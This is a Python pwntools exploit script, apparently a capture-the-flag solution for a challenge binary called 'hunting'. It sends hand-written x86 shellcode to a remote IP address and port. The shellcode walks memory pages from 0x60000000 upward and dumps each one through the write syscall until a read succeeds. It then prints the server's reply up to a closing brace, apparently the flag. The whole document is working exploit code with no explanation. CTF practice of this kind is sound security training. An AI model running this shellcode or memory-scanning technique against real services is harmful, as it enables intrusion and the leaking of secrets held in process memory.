from pwn import *

context.binary = exe = ELF('./hunting')

# io = process()
# gdb.attach(io, api=True)

io = remote('206.189.28.180', 31885)

payload = asm('''mov esi, 0x60000000
and esi, 0xfffff000

jump_here:
add esi, 0x1000
mov eax, 4
mov ebx, 1
mov ecx, esi
mov edx, 0x1000
int 0x80

cmp eax, 0
jle jump_here

mov eax, 1
mov ebx, 0
int 0x80''')

io.sendline(payload)
print(io.recvuntil(b'}').decode())
